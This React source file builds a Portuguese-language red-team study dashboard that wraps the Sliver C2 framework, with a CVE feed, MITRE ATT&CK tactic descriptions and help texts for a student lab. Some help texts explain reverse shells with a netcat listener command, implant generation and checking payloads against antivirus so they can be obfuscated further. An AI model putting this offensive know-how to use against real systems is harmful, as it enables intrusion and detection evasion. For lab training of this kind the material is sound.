import { useState, useEffect, useRef, useCallback } from "react";
import { fetchSessions, createSession, updateSessionStatus, deleteSession, fetchTechniques, createTechnique, deleteTechnique, fetchVms, createVm, deleteVm, upsertProgress, fetchCredentials, createCredential, deleteCredential, fetchLoot, saveLoot, deleteLoot, fetchTerminalHistory, saveTerminalEntry, clearTerminalHistory, fetchKillchain, upsertKillchain, fetchAllScans, saveScanResult, deleteScanResult, fetchIocs, createIoc, deleteIoc } from "./lib/api.js";
import { useSliver } from "./hooks/useSliver.js";
import { supabase } from "./lib/supabase.js";
import logo from "./assets/logo.png";
import { mitreHint } from "./lib/mitreHints.js";
import { generateLabReport } from "./lib/pdfReport.js";
import STUDY_COURSES from "./lib/studyFlashcards.js";


const SLIVER_STATUS = {
  connected: { color: "#4ade80", label: "SLIVER CONECTADO" },
  checking: { color: "#fbbf24", label: "VERIFICANDO..." },
  error: { color: "#ef4444", label: "ERRO NA BRIDGE" },
  disconnected: { color: "#64748B", label: "SLIVER DESCONECTADO" },
};

const SLIVER_PRESETS = [
  { label: "whoami", exe: "whoami", args: [], tactic: "Discovery", mitreId: "T1033" },
  { label: "hostname", exe: "hostname", args: [], tactic: "Discovery", mitreId: "T1082" },
  { label: "ipconfig /all", exe: "ipconfig", args: ["/all"], tactic: "Discovery", mitreId: "T1016" },
  { label: "systeminfo", exe: "systeminfo", args: [], tactic: "Discovery", mitreId: "T1082" },
  { label: "id", exe: "id", args: [], tactic: "Discovery", mitreId: "T1033" },
  { label: "ifconfig", exe: "ifconfig", args: [], tactic: "Discovery", mitreId: "T1016" },
];

const TACTICS = [
  "Reconnaissance", "Resource Development", "Initial Access", "Execution",
  "Persistence", "Privilege Escalation", "Defense Evasion", "Credential Access",
  "Discovery", "Lateral Movement", "Collection", "Command and Control",
  "Exfiltration", "Impact"
];

const TOOLS = ["Havoc", "Metasploit", "Nmap", "Burp Suite", "BloodHound", "Mimikatz", "Rubeus", "Sliver", "Outro"];

const STATUS_COLORS = {
  em_andamento: { bg: "#1a3a1a", text: "#4ade80", label: "Em andamento" },
  concluida: { bg: "#1a2a3a", text: "#60a5fa", label: "Concluída" },
  pausada: { bg: "#2a2a1a", text: "#fbbf24", label: "Pausada" }
};

const TACTIC_COLORS = {
  "Reconnaissance": "#6366f1", "Resource Development": "#8b5cf6",
  "Initial Access": "#ec4899", "Execution": "#ef4444",
  "Persistence": "#f97316", "Privilege Escalation": "#f59e0b",
  "Defense Evasion": "#eab308", "Credential Access": "#84cc16",
  "Discovery": "#22c55e", "Lateral Movement": "#10b981",
  "Collection": "#06b6d4", "Command and Control": "#3b82f6",
  "Exfiltration": "#a855f7", "Impact": "#f43f5e"
};

const TACTIC_LABELS_PT = {
  "Reconnaissance": "Reconhecimento",
  "Resource Development": "Desenvolvimento de Recursos",
  "Initial Access": "Acesso Inicial",
  "Execution": "Execução",
  "Persistence": "Persistência",
  "Privilege Escalation": "Escalação de Privilégios",
  "Defense Evasion": "Evasão de Defesa",
  "Credential Access": "Acesso a Credenciais",
  "Discovery": "Descoberta",
  "Lateral Movement": "Movimento Lateral",
  "Collection": "Coleta",
  "Command and Control": "Comando e Controle",
  "Exfiltration": "Exfiltração",
  "Impact": "Impacto",
};
const tacticLabel = (tactic) => TACTIC_LABELS_PT[tactic] || tactic;

const TACTIC_DESCRIPTIONS = {
  "Reconnaissance": "Coletar informações sobre o alvo (pessoas, infraestrutura, tecnologias) para planejar o ataque antes de qualquer comprometimento.",
  "Resource Development": "Preparar recursos que vão apoiar a operação: registrar domínios, montar infraestrutura de C2, criar contas ou desenvolver malware.",
  "Initial Access": "Conseguir o primeiro ponto de apoio dentro da rede do alvo — phishing, exploração de vulnerabilidade, credenciais válidas, etc.",
  "Execution": "Rodar código controlado pelo atacante numa máquina local ou remota — geralmente o passo logo após ganhar acesso.",
  "Persistence": "Garantir que o acesso sobreviva a reinicializações, troca de credenciais ou outras interrupções.",
  "Privilege Escalation": "Obter permissões de nível mais alto do que as conseguidas inicialmente (de usuário comum para admin/SYSTEM/root, por exemplo).",
  "Defense Evasion": "Evitar ser detectado por antivírus, EDR, logs ou analistas durante toda a operação.",
  "Credential Access": "Roubar credenciais (senhas, hashes, tokens, tickets) pra usar em outras técnicas como movimento lateral.",
  "Discovery": "Mapear o ambiente comprometido: usuários, rede, softwares instalados, estrutura da domínio, etc.",
  "Lateral Movement": "Se mover de uma máquina pra outra dentro da rede, geralmente usando credenciais ou serviços legítimos.",
  "Collection": "Reunir os dados de interesse antes de exfiltrar — arquivos, e-mails, capturas de tela, dados de banco.",
  "Command and Control": "Manter comunicação entre o implante na máquina comprometida e a infraestrutura do atacante (teamserver).",
  "Exfiltration": "Tirar os dados coletados de dentro da rede do alvo, geralmente de forma discreta.",
  "Impact": "Manipular, interromper ou destruir sistemas e dados — ransomware, sabotagem, DoS.",
};

const mitreUrl = (id) => {
  if (!id) return null;
  const [base, sub] = id.trim().split(".");
  if (!base) return null;
  return `https://attack.mitre.org/techniques/${base}${sub ? `/${sub}` : ""}/`;
};

const CVE_SEVERITY_COLORS = { CRITICAL: "#EF4444", HIGH: "#F97316", MEDIUM: "#F59E0B", LOW: "#4ade80" };

function CveDrawer({ cve, onClose }) {
  if (!cve) return null;

  const metric = cve.metrics?.cvssMetricV31?.[0] || cve.metrics?.cvssMetricV30?.[0] || cve.metrics?.cvssMetricV2?.[0];
  const severity = metric?.cvssData?.baseSeverity || metric?.baseSeverity;
  const score = metric?.cvssData?.baseScore;
  const descEn = cve.descriptions?.find(d => d.lang === "en")?.value;
  const desc = cve.pt_description || descEn;
  const weaknesses = (cve.weaknesses || []).flatMap(w => (w.description || []).map(d => d.value));
  const affected = (cve.affected || []).flatMap(a => (a.affectedData || []).map(ad => `${ad.vendor || ""} ${ad.product || ""}`.trim())).filter(Boolean);
  const references = cve.references || [];

  return (
    <>
      <div className="fixed inset-0 bg-black/60 z-[100]" onClick={onClose} />
      <div className="fixed top-0 right-0 h-full w-full max-w-md bg-cyber-surface border-l border-cyber-border z-[101] overflow-y-auto p-5">
        <div className="flex justify-between items-start mb-4">
          <div>
            <div className="text-sm font-bold text-cyber-accent font-mono">{cve.id}</div>
            {severity && (
              <span className="text-[10px] px-1.5 py-0.5 rounded font-bold mt-1 inline-block" style={{ background: `${CVE_SEVERITY_COLORS[severity] || "#64748B"}22`, color: CVE_SEVERITY_COLORS[severity] || "#64748B" }}>
                {severity}{score ? ` ${score}` : ""}
              </span>
            )}
          </div>
          <button onClick={onClose} className={`${BTN_GHOST} px-2 py-0.5`}></button>
        </div>

        <div className="text-[11px] text-cyber-muted mb-4">Publicado: {fmtDate(cve.published)} · Atualizado: {fmtDate(cve.lastModified)}</div>

        <div className="text-xs text-cyber-muted mb-1">
          DESCRIÇÃO{cve.pt_description && <span className="text-cyber-accent"> (traduzido)</span>}
        </div>
        <div className="text-[13px] text-cyber-text mb-4 whitespace-pre-wrap">{desc || "Sem descrição disponível."}</div>

        {cve.pt_description && descEn && (
          <details className="mb-4">
            <summary className="text-[11px] text-cyber-muted cursor-pointer hover:text-cyber-text">Ver original em inglês</summary>
            <div className="text-[12px] text-slate-400 mt-2 whitespace-pre-wrap">{descEn}</div>
          </details>
        )}

        {weaknesses.length > 0 && (
          <div className="mb-4">
            <div className="text-xs text-cyber-muted mb-1.5">TIPO DE FRAQUEZA (CWE)</div>
            <div className="flex flex-wrap gap-1.5">
              {weaknesses.map((w, i) => (
                <span key={i} className="text-[11px] bg-cyber-bg border border-cyber-border rounded px-2 py-0.5 font-mono text-cyber-text">{w}</span>
              ))}
            </div>
          </div>
        )}

        {affected.length > 0 && (
          <div className="mb-4">
            <div className="text-xs text-cyber-muted mb-1.5">AFETA</div>
            <div className="text-[12px] text-cyber-text">{affected.join(", ")}</div>
          </div>
        )}

        {references.length > 0 && (
          <div className="mb-4">
            <div className="text-xs text-cyber-muted mb-1.5">REFERÊNCIAS</div>
            <div className="flex flex-col gap-1">
              {references.slice(0, 10).map((r, i) => (
                <a key={i} href={r.url} target="_blank" rel="noreferrer" className="text-[11px] text-cyber-accent hover:underline truncate">
                  {r.url}
                </a>
              ))}
            </div>
          </div>
        )}

        <a
          href={`https://nvd.nist.gov/vuln/detail/${cve.id}`}
          target="_blank"
          rel="noreferrer"
          className={`${BTN_GHOST} block text-center mt-2`}
        >
          Ver página oficial na NVD →
        </a>
      </div>
    </>
  );
}

function CveFeed() {
  const [cves, setCves] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [selected, setSelected] = useState(null);

  const load = async () => {
    setLoading(true);
    setError(null);
    try {
      const res = await fetch("/api/cves");
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || `Erro ${res.status}`);
      setCves(data.vulnerabilities || []);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    load();
    const interval = setInterval(load, 5 * 60 * 1000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className={CARD}>
      <div className="flex justify-between items-center mb-3">
        <div className="text-xs text-cyber-muted">CVES RECENTES (NVD, 7 dias)<span className="animate-blink">_</span></div>
        <button onClick={load} className={BTN_GHOST}>↻</button>
      </div>
      {error && <div className="text-cyber-danger text-xs mb-2">{error}</div>}
      {loading && cves.length === 0 && !error && <div className="text-cyber-muted text-xs">Carregando...</div>}
      <div className="flex flex-col gap-2 max-h-[340px] overflow-y-auto">
        {cves.map(({ cve }) => {
          const metric = cve.metrics?.cvssMetricV31?.[0] || cve.metrics?.cvssMetricV30?.[0] || cve.metrics?.cvssMetricV2?.[0];
          const severity = metric?.cvssData?.baseSeverity || metric?.baseSeverity;
          const score = metric?.cvssData?.baseScore;
          const descEn = cve.descriptions?.find(d => d.lang === "en")?.value;
          const desc = cve.pt_description || descEn;
          return (
            <button
              key={cve.id}
              onClick={() => setSelected(cve)}
              className="block w-full text-left bg-cyber-bg border border-cyber-border rounded-md p-2.5 hover:border-cyber-accent transition-colors"
            >
              <div className="flex items-center gap-2 mb-1">
                <span className="text-xs font-bold text-cyber-text font-mono">{cve.id}</span>
                {severity && (
                  <span className="text-[10px] px-1.5 py-0.5 rounded font-bold" style={{ background: `${CVE_SEVERITY_COLORS[severity] || "#64748B"}22`, color: CVE_SEVERITY_COLORS[severity] || "#64748B" }}>
                    {severity}{score ? ` ${score}` : ""}
                  </span>
                )}
                <span className="text-[10px] text-cyber-muted ml-auto whitespace-nowrap">{fmtDate(cve.published)}</span>
              </div>
              {desc && (
                <div className="text-[11px] text-slate-400 line-clamp-2">
                  {desc}
                  {!cve.pt_description && descEn && <span className="text-cyber-muted italic"> (não traduzido)</span>}
                </div>
              )}
            </button>
          );
        })}
        {!loading && !error && cves.length === 0 && <div className="text-cyber-muted text-xs">Nenhum CVE publicado no período.</div>}
      </div>
      <CveDrawer cve={selected} onClose={() => setSelected(null)} />
    </div>
  );
}

const fmtDate = (d) => new Date(d).toLocaleDateString("pt-BR");
const fmtDateTime = (d) => new Date(d).toLocaleString("pt-BR");
const fmtBytes = (b) => {
  if (!b) return "0 B";
  const units = ["B", "KB", "MB", "GB"];
  let i = 0, n = Number(b);
  while (n >= 1024 && i < units.length - 1) { n /= 1024; i++; }
  return `${n.toFixed(i ? 1 : 0)} ${units[i]}`;
};

function fmtDuration(startIso, endIso) {
  const ms = new Date(endIso || Date.now()) - new Date(startIso);
  const totalMin = Math.max(0, Math.round(ms / 60000));
  const h = Math.floor(totalMin / 60);
  const m = totalMin % 60;
  if (h === 0) return `${m}min`;
  return `${h}h${m > 0 ? ` ${m}min` : ""}`;
}

function applyRealtimeChange(list, payload) {
  if (payload.eventType === "INSERT") {
    if (list.some(x => x.id === payload.new.id)) return list;
    return [payload.new, ...list];
  }
  if (payload.eventType === "UPDATE") {
    return list.map(x => x.id === payload.new.id ? payload.new : x);
  }
  if (payload.eventType === "DELETE") {
    return list.filter(x => x.id !== payload.old.id);
  }
  return list;
}

const CARD = "bg-cyber-surface border border-cyber-border rounded-lg p-4";
const INPUT = "bg-cyber-bg border border-cyber-border rounded-md text-cyber-text px-3 py-2 text-[13px] w-full font-mono outline-none box-border";
const BTN = "border-none text-white px-4 py-2 rounded-md text-xs font-mono font-bold cursor-pointer tracking-wide bg-cyber-accent";
const BTN_GHOST = "bg-transparent border border-cyber-border text-cyber-muted px-3 py-1.5 rounded-md text-[11px] font-mono cursor-pointer";
const LABEL = "text-[11px] text-cyber-muted mb-1 block";

// ─── Didactic Info Box ────────────────────────────────────────────────────
function InfoBox({ title, children, color = "#3b82f6", icon = "" }) {
  const [open, setOpen] = useState(false);
  return (
    <div className="mb-4 border rounded-lg overflow-hidden" style={{ borderColor: color + "40", background: color + "08" }}>
      <button onClick={() => setOpen(!open)} className="w-full flex items-center gap-2 px-3 py-2 text-left cursor-pointer bg-transparent border-none">
        <span className="text-sm">{icon}</span>
        <span className="text-[12px] font-bold flex-1" style={{ color }}>{title}</span>
        <span className="text-[11px] text-cyber-muted">{open ? " fechar" : " saiba mais"}</span>
      </button>
      {open && <div className="px-3 pb-3 text-[11px] text-cyber-text/80 leading-relaxed space-y-1.5">{children}</div>}
    </div>
  );
}

const SECTION_INFO = {
  overview: {
    title: "O que é o Overview?",
    icon: "-",
    content: (
      <>
        <p>O <b>Overview</b> é seu painel central de progresso. Ele resume todas as suas sessões de estudo e técnicas praticadas em números rápidos.</p>
        <p><b>Sessões</b> = cada vez que você senta pra praticar no lab (ex: "Testar Lateral Movement no AD").</p>
        <p><b>Taxa de Sucesso</b> = porcentagem de técnicas que você conseguiu executar com êxito.</p>
        <p><b>Horas Dedicadas</b> = tempo total que você passou praticando — importante pro TCC mostrar dedicação.</p>
        <p><b>Top Táticas</b> = as 14 fases da kill chain MITRE que você mais praticou. Ideal pra identificar gaps de estudo.</p>
        <p><b>CVE Feed</b> = vulnerabilidades recentes do NVD (NIST). Acompanhar CVEs é parte da rotina de um red teamer.</p>
      </>
    ),
  },
  sessions: {
    title: "O que são Sessões de Lab?",
    icon: "-",
    content: (
      <>
        <p>Uma <b>Sessão</b> representa uma prática de estudo no seu lab. Cada vez que você liga as VMs e começa a trabalhar, crie uma sessão.</p>
        <p><b>Como usar:</b> crie a sessão → defina o objetivo (ex: "Testar Kerberoasting") → pratique → registre as técnicas usadas → marque como concluída.</p>
        <p><b>Kill Chain Checklist ():</b> cada sessão tem um checklist das 14 fases da MITRE. Marque quais fases você cobriu naquela prática.</p>
        <p><b>Dica para o TCC:</b> quanto mais sessões documentadas com objetivos claros, mais forte fica sua metodologia na defesa.</p>
      </>
    ),
  },
  techniques: {
    title: "O que são Técnicas?",
    icon: "-",
    content: (
      <>
        <p>Uma <b>Técnica</b> é uma ação específica que você executou no lab, mapeada para o framework MITRE ATT&CK.</p>
        <p><b>MITRE ID</b> (ex: T1059) = identificador único da técnica no framework. Clique pra ver a descrição oficial.</p>
        <p><b>Tática</b> = a fase da kill chain (Reconnaissance, Execution, Persistence, etc.).</p>
        <p><b>Sucesso/Falhou</b> = se a técnica funcionou ou não. Documentar falhas também é valioso — mostra aprendizado.</p>
        <p><b>Notas de Detecção ()</b> = como um blue teamer detectaria essa técnica. Isso mostra visão purple team no TCC.</p>
        <p><b> Hint Box</b> = explicação automática da técnica baseada no MITRE ID que você preencheu.</p>
      </>
    ),
  },
  vms: {
    title: "O que são VMs do Lab?",
    icon: "-",
    content: (
      <>
        <p>Aqui você cadastra as <b>máquinas virtuais</b> do seu ambiente de estudo.</p>
        <p><b>Atacante ()</b> = sua máquina Kali/Parrot de onde você lança os ataques e roda o Sliver.</p>
        <p><b>Vítima ()</b> = máquinas que você vai atacar (Windows Server, Ubuntu, etc.).</p>
        <p><b>Infra ()</b> = serviços auxiliares como Domain Controller, DNS, DHCP.</p>
        <p><b>Hostname</b> = use o nome real da VM! O CyberLab linka automaticamente com sessões Sliver ativas pelo hostname.</p>
        <p><b>Dica:</b> sempre crie snapshots "clean" das VMs vítimas antes de começar, pra poder restaurar depois.</p>
      </>
    ),
  },
  mitre: {
    title: "O que é o MITRE ATT&CK?",
    icon: "-",
    content: (
      <>
        <p>O <b>MITRE ATT&CK</b> é o framework global que mapeia como adversários reais atacam. Ele divide ataques em 14 táticas (fases) e centenas de técnicas.</p>
        <p><b>Mapa de Cobertura</b> = heatmap mostrando quais táticas você já praticou. Quanto mais escuro, mais técnicas naquela fase.</p>
        <p><b>As 14 Táticas (Kill Chain):</b></p>
        <p>1. <b>Reconnaissance</b> — coletar info sobre o alvo (OSINT, scan)</p>
        <p>2. <b>Resource Development</b> — preparar infraestrutura de ataque (comprar domínios, criar malware)</p>
        <p>3. <b>Initial Access</b> — conseguir o primeiro acesso (phishing, exploit, credenciais)</p>
        <p>4. <b>Execution</b> — rodar código no alvo (PowerShell, scripts, binários)</p>
        <p>5. <b>Persistence</b> — manter acesso mesmo após reboot (serviços, registry, cron)</p>
        <p>6. <b>Privilege Escalation</b> — subir de user normal pra admin/root</p>
        <p>7. <b>Defense Evasion</b> — fugir do antivírus e detecção</p>
        <p>8. <b>Credential Access</b> — roubar senhas e hashes (Mimikatz, Kerberoast)</p>
        <p>9. <b>Discovery</b> — mapear a rede interna e o ambiente</p>
        <p>10. <b>Lateral Movement</b> — mover-se para outras máquinas</p>
        <p>11. <b>Collection</b> — coletar dados do alvo</p>
        <p>12. <b>Command and Control (C2)</b> — manter canal de comunicação com o implant</p>
        <p>13. <b>Exfiltration</b> — tirar dados da rede do alvo</p>
        <p>14. <b>Impact</b> — causar dano (ransomware, destruição, DoS)</p>
      </>
    ),
  },
  credentials: {
    title: "O que é o Cofre de Credenciais?",
    icon: "-",
    content: (
      <>
        <p>Aqui você armazena as <b>credenciais capturadas</b> durante os exercícios — como um red teamer faria na vida real.</p>
        <p><b>Tipos:</b> senha em texto, hash NTLM, hash NTLMv2, ticket Kerberos, token, chave SSH, etc.</p>
        <p><b>Por que documentar?</b> Em um pentest real, você precisa rastrear quais credenciais capturou, de onde vieram, e quais acessos elas dão.</p>
        <p><b>Dica:</b> vincule a credencial à VM de origem e à sessão onde foi capturada pra ter rastreabilidade completa.</p>
      </>
    ),
  },
  netmap: {
    title: "O que é o Mapa de Rede?",
    icon: "-",
    content: (
      <>
        <p>O <b>Network Map</b> mostra uma visão visual das suas VMs e suas conexões. É o equivalente a um diagrama de rede do lab.</p>
        <p><b>Por que é importante?</b> Em um pentest, você sempre precisa mapear a topologia da rede. Saber quais máquinas se comunicam e por quais portas é fundamental.</p>
        <p><b>Cores:</b>  Atacante (vermelho) →  Vítimas (laranja) →  Infra (azul).</p>
      </>
    ),
  },
  cyberscan: {
    title: "O que é o CyberScan?",
    icon: "-",
    content: (
      <>
        <p>O <b>CyberScan</b> é um scanner de portas integrado que roda na sua máquina atacante via bridge Python.</p>
        <p><b>Como funciona:</b> ele abre conexões TCP para cada porta do alvo. Se a porta aceita a conexão, ela está aberta.</p>
        <p><b>Perfis de scan:</b></p>
        <p>• <b>Quick</b> — 10 portas mais comuns (21, 22, 80, 443, etc.). Rápido.</p>
        <p>• <b>Default</b> — 28 portas, cobre a maioria dos serviços. Equilíbrio.</p>
        <p>• <b>Full</b> — 120+ portas, scan completo. Lento mas abrangente.</p>
        <p><b>Banner Grabbing</b> = o scanner envia requisições para identificar o serviço e versão (ex: "Apache/2.4.41").</p>
        <p><b>OS Fingerprinting</b> = tenta identificar o sistema operacional baseado nos banners dos serviços.</p>
        <p><b>Equivalente real:</b> é como um <code>nmap -sV</code> simplificado, feito em Python com asyncio.</p>
      </>
    ),
  },
  dorks: {
    title: "O que são Google Dorks?",
    icon: "-",
    content: (
      <>
        <p><b>Google Dorks</b> são consultas avançadas no Google para encontrar informações sensíveis expostas na internet.</p>
        <p><b>Operadores comuns:</b></p>
        <p>• <code>site:alvo.com</code> — restringir busca a um domínio</p>
        <p>• <code>filetype:pdf</code> — buscar tipos de arquivo específicos</p>
        <p>• <code>intitle:"index of"</code> — encontrar diretórios abertos</p>
        <p>• <code>inurl:admin</code> — páginas com "admin" na URL</p>
        <p><b>Uso em pentest:</b> fase de Reconnaissance (T1593). Encontrar documentos internos, painéis admin expostos, arquivos de configuração, credenciais vazadas.</p>
        <p><b>Ética:</b> em um pentest real, você só dork o domínio autorizado no escopo do contrato.</p>
      </>
    ),
  },
  virustotal: {
    title: "O que é o VirusTotal?",
    icon: "-",
    content: (
      <>
        <p>O <b>VirusTotal</b> agrega 70+ antivírus para analisar arquivos, URLs, domínios e hashes.</p>
        <p><b>Uso ofensivo:</b> verificar se seu implant/payload é detectado antes de enviar pro alvo. Se muitos AVs detectam, você precisa ofuscar mais.</p>
        <p><b>Uso defensivo:</b> analisar arquivos suspeitos encontrados durante investigação.</p>
        <p><b>Atenção:</b> NÃO envie implants reais pro VT em um pentest real — os AVs vão criar assinaturas e queimar seu payload. Use apenas hashes.</p>
      </>
    ),
  },
  ioc: {
    title: "O que são IOCs?",
    icon: "-",
    content: (
      <>
        <p><b>IOC (Indicator of Compromise)</b> = evidência digital de que um ataque aconteceu.</p>
        <p><b>Tipos comuns:</b></p>
        <p>• <b>Hash</b> (MD5/SHA1/SHA256) — identificador único de um arquivo malicioso</p>
        <p>• <b>IP Address</b> — IP do servidor C2 ou do atacante</p>
        <p>• <b>Domínio</b> — domínio usado para C2 ou phishing</p>
        <p>• <b>Regra Sigma</b> — regra de detecção para logs (equivalente a assinatura de IDS pra logs)</p>
        <p>• <b>Regra Yara</b> — regra pra detectar malware por padrão binário</p>
        <p><b>Por que documentar?</b> Em purple team, você gera IOCs no ataque e depois testa se o blue team consegue detectar. Isso é ouro pro TCC.</p>
      </>
    ),
  },
  scripts: {
    title: "O que é o Script Arsenal?",
    icon: "-",
    content: (
      <>
        <p>O <b>Script Arsenal</b> é uma coleção de comandos reais usados em pentests profissionais, organizados por categoria.</p>
        <p><b>Reverse Shells:</b> comandos que fazem o alvo se conectar de volta pra sua máquina. Você roda <code>nc -lvnp 4444</code> na atacante, e o comando no alvo cria a conexão reversa.</p>
        <p><b>Por que reversa?</b> Firewalls bloqueiam conexões entrantes, mas geralmente permitem saintes. A conexão reversa sai do alvo pro atacante.</p>
        <p><b>LHOST/LPORT:</b> LHOST = IP da sua máquina atacante. LPORT = porta onde você está ouvindo.</p>
        <p><b>Enumeração:</b> comandos pra mapear o sistema após obter acesso — usuários, rede, serviços, permissões.</p>
        <p><b>PrivEsc:</b> técnicas pra escalar privilégios de user normal pra root/admin.</p>
        <p><b>Todos os scripts são reais</b> e funcionam em ambientes de lab. Configure LHOST/LPORT corretamente.</p>
      </>
    ),
  },
  playbooks: {
    title: "O que são Playbooks de Pentest?",
    icon: "-",
    content: (
      <>
        <p>Um <b>Playbook</b> é um roteiro passo-a-passo de uma metodologia de pentest. Como um checklist de piloto antes do voo.</p>
        <p><b>External Pentest:</b> simula um atacante da internet tentando entrar na rede (Recon → Scan → Exploit → Post-Exploitation).</p>
        <p><b>Internal Pentest:</b> simula um atacante que já está na rede interna tentando chegar a Domain Admin (Discovery → AD Enum → Kerberoast → Lateral → DA).</p>
        <p><b>Web App Pentest:</b> testa vulnerabilidades web (OWASP Top 10 — SQLi, XSS, IDOR, LFI, etc.).</p>
        <p><b>Wireless Pentest:</b> testa redes Wi-Fi (captura de handshake, WPA crack, evil twin).</p>
        <p><b>Como usar:</b> escolha o playbook → siga cada fase → marque os passos concluídos → anote observações. Os comandos são copiáveis.</p>
        <p><b>Cada passo tem o MITRE ID</b> correspondente, então tudo que você fizer aqui já está mapeado pro framework.</p>
      </>
    ),
  },
  netmon: {
    title: "O que é o Network Monitor?",
    icon: "-",
    content: (
      <>
        <p>O <b>Network Monitor</b> captura pacotes de rede em tempo real, similar ao Wireshark mas integrado no dashboard.</p>
        <p><b>Como funciona:</b> usa raw sockets na máquina atacante (via bridge Python) pra capturar todo tráfego que passa pela interface de rede.</p>
        <p><b>O que cada coluna mostra:</b></p>
        <p>• <b>Proto</b> — protocolo (TCP, UDP, ICMP)</p>
        <p>• <b>Source/Dest</b> — IPs de origem e destino</p>
        <p>• <b>Port</b> — portas de origem e destino</p>
        <p>• <b>Service</b> — serviço identificado pela porta (HTTP, SSH, SMB, etc.)</p>
        <p>• <b>Flags</b> — flags TCP (SYN, ACK, PSH, FIN) — indicam o estado da conexão</p>
        <p>• <b>Preview</b> — primeiros bytes do payload (útil pra ver requisições HTTP, etc.)</p>
        <p><b>Requer:</b> bridge rodando como admin/root (raw sockets precisam de permissão elevada).</p>
        <p><b>Dica:</b> use os filtros pra focar no tráfego relevante — filtrar por IP do alvo ou porta do C2.</p>
      </>
    ),
  },
  "beacon-lab": {
    title: "O que é o Beacon Lab?",
    icon: "-",
    content: (
      <>
        <p>O <b>Beacon Lab</b> é um construtor visual de implants do Sliver C2.</p>
        <p><b>Implant vs Beacon:</b></p>
        <p>• <b>Session (implant)</b> = conexão persistente em tempo real. Mais barulhento mas interativo.</p>
        <p>• <b>Beacon</b> = faz check-in periodicamente (ex: a cada 60s). Mais furtivo, parece tráfego normal.</p>
        <p><b>Parâmetros:</b></p>
        <p>• <b>C2 URL</b> — endereço do seu listener (ex: http://10.10.10.1:80)</p>
        <p>• <b>Protocolo</b> — HTTP (porta 80, parece tráfego web), HTTPS (criptografado), mTLS (mutual TLS)</p>
        <p>• <b>OS/Arch</b> — sistema operacional e arquitetura do alvo</p>
        <p>• <b>Formato</b> — EXE (executável), DLL (shared lib), Shellcode (injeção em memória)</p>
        <p>• <b>Jitter</b> — variação aleatória no intervalo de check-in. Jitter alto = mais difícil de detectar padrões.</p>
      </>
    ),
  },
  labcheck: {
    title: "O que é o Lab Check?",
    icon: "-",
    content: (
      <>
        <p>O <b>Lab Check</b> é um checklist pré-lab. Antes de começar uma sessão de estudo, verifique se tudo está funcionando.</p>
        <p><b>Por que isso é importante?</b> Nada pior que perder 30 minutos debugando porque esqueceu de ligar uma VM ou o listener não estava ativo.</p>
        <p><b>Como funciona:</b> clique OK ou NOK em cada item. Se NOK, o sistema mostra o comando exato pra corrigir.</p>
        <p><b>Checklist cobre:</b> bridge Python, Sliver teamserver, listeners, VMs, rede, implants, Supabase, snapshots.</p>
      </>
    ),
  },
  navigator: {
    title: "O que é o ATT&CK Navigator Export?",
    icon: "-",
    content: (
      <>
        <p>O <b>ATT&CK Navigator</b> é uma ferramenta oficial do MITRE que visualiza técnicas em uma matriz interativa.</p>
        <p><b>O que esse módulo faz:</b> exporta todas as técnicas que você praticou como um arquivo JSON (layer) compatível com o Navigator.</p>
        <p><b>Como usar:</b> baixe o JSON → abra <a href="https://mitre-attack.github.io/attack-navigator/" target="_blank" rel="noreferrer" className="text-cyber-accent hover:underline">mitre-attack.github.io/attack-navigator</a> → Open Existing Layer → Upload.</p>
        <p><b>No TCC:</b> a imagem do Navigator com suas técnicas praticadas é uma visualização poderosa pra incluir no trabalho.</p>
      </>
    ),
  },
  scoring: {
    title: "O que é o Sistema de Scoring?",
    icon: "-",
    content: (
      <>
        <p>O <b>Scoring</b> gamifica seu estudo. Você ganha XP por cada técnica praticada e desbloqueia achievements.</p>
        <p><b>XP:</b> 50 XP por técnica registrada + 25 XP bônus se teve sucesso + 100 XP por nova tática coberta + 200 XP por achievement.</p>
        <p><b>Ranks:</b> Script Kiddie → Pentester Jr → Red Teamer → Operator → APT Operator → Shadow Broker.</p>
        <p><b>Achievements:</b> conquistas especiais como "Cobriu 100% do Discovery", "Primeiro Shell", "Full Kill Chain" (todas as 14 táticas).</p>
        <p><b>Motivação:</b> gamificação comprovadamente aumenta engajamento no estudo. Bom argumento pro TCC.</p>
      </>
    ),
  },
  flashcards: {
    title: "O que são os Flashcards?",
    icon: "🃏",
    content: (
      <>
        <p>Os <b>Flashcards</b> são um modo quiz pra testar seu conhecimento das técnicas que você estudou.</p>
        <p><b>Como funciona:</b> o sistema mostra o MITRE ID (ex: T1059) e você tenta lembrar: qual técnica é? Como executa? Como detecta?</p>
        <p><b>Spaced Repetition:</b> técnica de estudo comprovada — revisar informação em intervalos espaçados melhora retenção a longo prazo.</p>
        <p><b>Dica:</b> use antes da defesa do TCC pra revisar todas as técnicas que você praticou.</p>
      </>
    ),
  },
  compare: {
    title: "O que é a Comparação de Sessões?",
    icon: "-",
    content: (
      <>
        <p>A <b>Comparação</b> mostra duas sessões lado a lado pra você ver sua evolução.</p>
        <p><b>O que compara:</b> quantidade de técnicas, taxa de sucesso, táticas cobertas, ferramentas usadas, duração.</p>
        <p><b>Para o TCC:</b> comparar a primeira sessão com a última mostra claramente sua evolução — ótimo pra seção de resultados.</p>
      </>
    ),
  },
  writeup: {
    title: "O que é o Writeup?",
    icon: "-",
    content: (
      <>
        <p>O <b>Writeup</b> gera automaticamente um relatório da sessão em formato Markdown.</p>
        <p><b>Conteúdo:</b> dados da sessão, técnicas usadas organizadas por tática, credenciais capturadas, notas de detecção.</p>
        <p><b>Uso:</b> exporte e use como base pra documentação do TCC ou relatório de pentest profissional.</p>
      </>
    ),
  },
  c2: {
    title: "O que é o Sliver C2?",
    icon: "-",
    content: (
      <>
        <p>O <b>Sliver</b> é um framework de Command & Control (C2) open-source criado pela Bishop Fox.</p>
        <p><b>C2</b> = infraestrutura que permite controlar máquinas comprometidas remotamente.</p>
        <p><b>Fluxo:</b> você gera um implant → executa no alvo → o alvo se conecta de volta ao seu listener → você controla a máquina pelo painel.</p>
        <p><b>Sessions</b> = conexões interativas em tempo real. <b>Beacons</b> = check-ins periódicos (mais furtivos).</p>
        <p><b>O painel do CyberLab permite:</b> ver sessões/beacons ativos, executar comandos, fazer upload/download de arquivos, tirar screenshots, ver processos e conexões de rede.</p>
        <p><b>Bridge Python:</b> o CyberLab se comunica com o Sliver via uma API REST (FastAPI) que traduz pra gRPC. A bridge roda na máquina atacante.</p>
      </>
    ),
  },
};

